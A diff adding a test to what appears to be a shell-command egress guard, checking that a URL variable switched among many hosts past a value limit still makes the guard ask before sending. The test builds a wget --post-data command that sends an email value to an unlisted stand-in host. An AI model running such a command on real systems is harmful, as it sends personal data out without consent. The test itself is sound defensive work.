@@ -253,6 +253,20 @@ test('config: egressAllowHosts skips listed hosts, exact or *.suffix', async (t)
   assert.equal((await mcp({ url: 'https://api.example.com', headers: { a: EMAIL } }, { home })).decision, 'none');
 });
 
+test('config: a URL variable past the value limit still asks for the hosts it may hold', async (t) => {
+  // The destructive rules are off so the line reaches the network check. Sixteen values on allowed hosts, then two past
+  // the limit on an unlisted host: the request still asks (the URL words are read as written, and past the limit the
+  // network check refuses to check only some values).
+  const home = homeWith(t, { egressAllowHosts: ['*.example.com'], blockDestructiveCommands: false });
+  const guards = [];
+  for (let i = 0; i < 15; i++) guards.push('[ -n "$A' + i + '" ] && U=https://h' + i + '.example.com/v1');
+  for (let i = 0; i < 2; i++) guards.push('[ -n "$B' + i + '" ] && U=https://other' + i + '.example.net/v1');
+  const cmd = 'U=https://api.example.com/v1; ' + guards.join('; ') + '; wget --post-data "mail=' + EMAIL + '" "$U"';
+  assert.equal((await bash(cmd, { home })).decision, 'ask');
+  const one = 'U=https://api.example.com/v1; [ -n "$A" ] && U=https://other.example.net/v1; wget --post-data "mail=' + EMAIL + '" "$U"';
+  assert.equal((await bash(one, { home })).decision, 'ask');
+});
+
 /* --------------------------- joined with other checks ------------------- */
 
 test('a placeholder in the arguments is refused before the egress check asks about the same command', async () => {
